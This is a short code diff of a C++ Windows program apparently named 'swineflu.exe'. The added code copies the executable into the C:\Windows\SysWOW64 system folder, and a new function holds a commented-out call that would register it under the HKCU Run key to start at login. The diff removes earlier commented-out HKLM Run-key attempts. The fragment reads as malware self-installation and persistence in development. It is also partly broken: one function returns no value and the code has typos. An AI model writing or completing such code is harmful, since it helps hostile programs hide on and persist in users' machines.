@@ -13,9 +13,14 @@
 
 
 #include <iostream>
-
 using namespace std;
 
+
+
+int addRunEntry()
+{
+	//RegSetKeyValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, REG_SZ, "C:\\Windows\\SysWOW64\\swineflu.exe", strlen("C:\\Windows\\SysWOW64\\swineflu.exe") + 1);
+}
 
 string ExePath() {
 	char buffer[MAX_PATH];
@@ -26,14 +31,12 @@ string ExePath() {
 
 void adminstartup()
 {
+	HKEY hkey;
+	DWORD dwDispoition;
+
 	string str = ExePath();
 	printf(str.c_str());
 	str.append("\\swineflu.exe");
-//CopyFile(L"SwineFlu.exe", L"C:\\Windows\\SwineFlu.dll", true);
-	//TCHAR path[MAX_PATH] = { 0 };
-	//GetModuleFileName(NULL, path, MAX_PATH);
-	//PathRemoveFileSpec(path);
-	//PathAppend(path, _T("SwineFlu.exe"));
 
 	BOOL b = CopyFile(str.c_str(),
 		"C:\\Windows\\SysWOW64\\swineflu.exe", 0);
@@ -47,12 +50,7 @@ void adminstartup()
 		printf("okay/n");
 	}
 
-	HKEY hkey;
-	DWORD dwDispoition;
 
-	//RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
-	//const unsigned char path[150] = "C:\\Windows\\myprogram.exe";
-	//RegSetValueEx(hkey, L"My Directory", 0, 1, path, sizeof(path));
 	getchar();
 }
 
